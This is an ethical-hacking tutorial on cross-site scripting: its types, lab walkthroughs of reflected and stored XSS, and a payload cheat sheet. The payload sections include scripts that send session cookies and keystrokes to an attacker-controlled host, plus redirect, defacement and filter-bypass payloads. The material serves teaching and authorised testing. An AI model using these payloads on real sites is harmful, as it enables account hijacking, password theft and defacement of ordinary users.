# Day 20 — Exploitation: Cross-Site Scripting (XSS)

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 19 — SQL Injection](#) | Next: [Day 21](#)

---

## 📋 Table of Contents

1. [What is XSS?](#1-what-is-xss)
2. [Why XSS Happens](#2-why-xss-happens)
3. [Types of XSS](#3-types-of-xss)
4. [What XSS Can Do](#4-what-xss-can-do)
5. [Practical 1: Reflected XSS](#5-practical-1-reflected-xss)
6. [Practical 2: Stored XSS](#6-practical-2-stored-xss)
7. [XSS Payload Reference](#7-xss-payload-reference)
8. [Finding XSS — Methodology](#8-finding-xss--methodology)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. What is XSS?

**Cross-Site Scripting (XSS)** is a web application vulnerability that allows an attacker to inject and execute **malicious JavaScript** in a victim's browser.

> 💡 The name comes from the `X` in XSS — `X` stands for "Cross" (as in cross-site). It's an **injection attack**, just like SQL Injection, but instead of injecting SQL queries, you inject JavaScript code.

**Where it appears in OWASP Top 10:** Under the **Injection** category.

**Key condition for XSS:** The web application uses **unsanitized user input** — it takes what you type and puts it directly into the page without checking or cleaning it.

---

## 2. Why XSS Happens

```
Normal flow:
[User types: "football"] → [App shows: "You searched for: football"]

XSS flow:
[User types: <script>alert('hello')</script>]
→ [App puts it in page as-is]
→ [Browser executes the JavaScript!]
→ [Alert popup appears]
```

**Root cause:** User input is not validated or sanitized before being included in the HTML response.

**Languages where XSS is possible:**
- JavaScript (most common — front-end of almost every web app)
- VBScript (Visual Basic Script)
- Flash (legacy/older sites)
- CSS (in some edge cases)

---

## 3. Types of XSS

### Stored XSS (Most Dangerous)

The malicious payload is **permanently saved in the database** — it affects every user who visits the page.

```
[Attacker] → posts malicious comment/post with XSS payload
        ↓
[Database] → stores the payload
        ↓
[Any user visits the page] → payload loads from DB → executes in their browser
```

**Common injection points:** Comment sections, forum posts, user profiles, product reviews, chat messages.

**Why it's the most dangerous:** One injection → infinite victims (everyone who views that page).

---

### Reflected XSS

The malicious payload is part of the **URL or request** — it's reflected back in the response but NOT stored. The attacker must **send the malicious URL to the victim**.

```
[Attacker crafts URL]: http://site.com/search?q=<script>alert(1)</script>
        ↓
[Attacker sends URL to victim via phishing/social engineering]
        ↓
[Victim clicks URL] → request sent to server → payload reflected in response → executes in victim's browser
```

**Key difference from Stored:** Not persistent — must be delivered to each victim individually.

---

### DOM-Based XSS

Exploits the **Document Object Model (DOM)** — JavaScript on the page itself processes the malicious input and writes it to the DOM without server involvement.

> 💡 **DOM** = Document Object Model — the structured tree representation of an HTML page. Every element (heading, paragraph, button) is a node in this tree that JavaScript can read and modify.

**Same payloads work** — testing methodology is similar to Stored/Reflected XSS.

---

### Comparison Table

| Aspect | Stored XSS | Reflected XSS | DOM-Based XSS |
|--------|-----------|---------------|---------------|
| **Payload stored?** | ✅ Yes (database) | ❌ No | ❌ No |
| **Who is affected?** | All page visitors | Only users who click the link | Only users with the crafted URL |
| **Delivery method** | Just visit the page | Send crafted URL to victim | Send crafted URL to victim |
| **Persistence** | Permanent (until removed) | One-time per click | One-time per click |
| **Danger level** | 🔴 Highest | 🟡 Medium | 🟡 Medium |
| **Common locations** | Comments, posts, profiles | Search bars, error messages | URL fragments, client-side JS |

---

## 4. What XSS Can Do

| Attack | Payload Type | Impact |
|--------|-------------|--------|
| **Alert popup** | `alert()` | Proof of concept — confirms XSS works |
| **Cookie theft** | `document.cookie` | Steal session cookies → hijack user accounts |
| **Keylogging** | Event listeners | Capture every keystroke → steal passwords |
| **Page defacement** | `document.write()` or DOM manipulation | Change website content |
| **Redirect** | `window.location` | Redirect victim to attacker-controlled site |
| **Port scanning** | XHR requests | Scan victim's internal network |
| **Phishing** | `document.write()` | Replace login form with fake one |

---

## 5. Practical 1: Reflected XSS

**Target:** Search field on a web app  
**Goal:** Trigger a popup alert saying "hello"

### Step 1: Test if input is reflected

```
Search for: football
Result shows: "You searched for: football"
```

The search term appears in the page → input is reflected → potential XSS!

### Step 2: Test with an HTML tag

```
Search for: <h1>test</h1>
```

- If page shows the text as a heading → HTML is being rendered (not escaped)
- If page shows literal `<h1>test</h1>` → tags are escaped (harder to exploit)

### Step 3: Inject the XSS payload

```html
<script>alert('hello')</script>
```

Enter this in the search field and submit.

**If vulnerable:** A JavaScript alert popup appears saying "hello"  
**If not vulnerable:** The text appears literally on the page (input is sanitized)

### Step 4: Cookie theft payload

```html
<script>alert(document.cookie)</script>
```

This displays the victim's session cookie in an alert box — confirms cookie theft is possible.

### How to test multiple input points

Check every input field on the page:
- Search bar (top)
- URL parameters (`?q=`, `?id=`, `?name=`)
- Form fields
- Comment boxes

For each: type something → check if it appears anywhere in the page → if yes, try XSS payloads there.

---

## 6. Practical 2: Stored XSS

**Target:** Comment section on a web app  
**Goal:** Inject a persistent XSS payload that executes for every visitor

### Step 1: Register/log in to the app

Create an account and log in.

### Step 2: Test if HTML renders in comments

Add a comment with an HTML tag:

```html
<h1>Subscribe</h1>
```

- If the word "Subscribe" appears as a **large heading** → HTML is rendered → XSS likely works
- If it appears as literal text → HTML is escaped

### Step 3: Inject the XSS payload

```html
<script>alert(document.cookie)</script>
```

Post this as a comment.

**Result:** Every user who loads the comment section will see a popup showing their own session cookie.

### Step 4: Page defacement via stored XSS

First, find the element ID using browser dev tools (F12 → Inspector):

```html
<!-- Example: the page title has id="thm-title" -->
<span id="thm-title">XSS Playground</span>
```

Then inject this as a comment:

```html
<script>
  document.querySelector('#thm-title').textContent = 'I am a Hacker';
</script>
```

**Result:** Every visitor sees the page title changed to "I am a Hacker" — a classic website defacement via XSS.

### Why Stored XSS is powerful

```
You post ONE malicious comment
        ↓
1,000 users visit the page
        ↓
All 1,000 users execute your JavaScript in their browsers
        ↓
You receive 1,000 session cookies (if payload sends them to your server)
```

---

## 7. XSS Payload Reference

### Basic Confirmation Payloads

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert('hello')</script>
```

### Cookie Theft

```html
<script>alert(document.cookie)</script>
```

**To send cookies to your server (real attack):**
```html
<script>
  new Image().src = 'http://attacker-server.com/steal?c=' + document.cookie;
</script>
```

### Page Defacement

```html
<script>document.write('<h1>Hacked</h1>')</script>
<script>document.querySelector('#element-id').textContent = 'New text'</script>
<script>document.body.innerHTML = '<h1>Defaced</h1>'</script>
```

### Redirect

```html
<script>window.location = 'http://attacker-site.com'</script>
```

### Keylogger (capture keystrokes)

```html
<script>
  document.addEventListener('keydown', function(e) {
    new Image().src = 'http://attacker-server.com/log?k=' + e.key;
  });
</script>
```

### Filter Bypass Payloads

When `<script>` tags are filtered:

```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<a href="javascript:alert(1)">click</a>
<iframe onload="alert(1)">
```

Case variation bypasses:
```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
```

---

## 8. Finding XSS — Methodology

```
Step 1: IDENTIFY INPUT POINTS
  → Search bars
  → URL parameters (?q=, ?id=, ?name=)
  → Comment / review / post fields
  → Profile fields (username, bio, etc.)
  → Any form field that takes user input

Step 2: CHECK IF INPUT IS REFLECTED
  → Type a unique word (e.g., "xsstest123")
  → Check if it appears anywhere in the page source or rendered output
  → Use browser F12 → Network → Response to inspect

Step 3: TEST HTML RENDERING
  → Try: <h1>test</h1>
  → If rendered as heading → HTML not escaped → likely vulnerable
  → If shown as literal text → escaped (but bypass payloads may still work)

Step 4: INJECT XSS PAYLOAD
  → Start with: <script>alert('XSS')</script>
  → If blocked, try filter bypass payloads
  → Try: <img src=x onerror=alert(1)>

Step 5: ESCALATE
  → Replace alert() with document.cookie to confirm cookie access
  → Build payload to exfiltrate data to your server
```

---

## 9. Quick Reference Cheat Sheet

### XSS Types Summary

```
Stored XSS:    Payload saved in DB → affects ALL visitors → most dangerous
Reflected XSS: Payload in URL → affects only users who click the link
DOM-Based XSS: Client-side JS processes the payload → no server involved
```

### Basic Test Payloads

```html
<!-- Confirm XSS works -->
<script>alert('XSS')</script>

<!-- Confirm cookie access -->
<script>alert(document.cookie)</script>

<!-- If script tags are blocked -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
```

### Cookie Theft (send to server)

```html
<script>
  new Image().src = 'http://YOUR-SERVER/steal?c=' + document.cookie;
</script>
```

### Page Defacement

```html
<!-- Replace element text -->
<script>document.querySelector('#id').textContent = 'Hacked'</script>

<!-- Overwrite entire page -->
<script>document.body.innerHTML = '<h1>Hacked</h1>'</script>
```

### XSS vs SQLi

| | SQL Injection | XSS |
|-|--------------|-----|
| **Target** | Database | Browser / User |
| **Language injected** | SQL | JavaScript |
| **Goal** | Dump DB data | Execute JS in victim's browser |
| **Impact** | Data theft, DB manipulation | Session hijacking, defacement, phishing |

### Testing Checklist

```
□ Search bars — type test → does it appear on page?
□ URL parameters — add ' to test, change values
□ Comment fields — try <h1>test</h1> → rendered as heading?
□ User profile fields — does username appear in page?
□ Error messages — does your input reflect in error text?
```

---

> ✅ **End of Day 20 Notes**  
> 📌 Next up: More web application attacks  
> 💡 Practice: TryHackMe OWASP Top 10 room (XSS section), DVWA, or WebGoat  
> ⚠️ Only test on applications you own or have explicit permission to test  
> 💬 Questions? Drop them in the comments!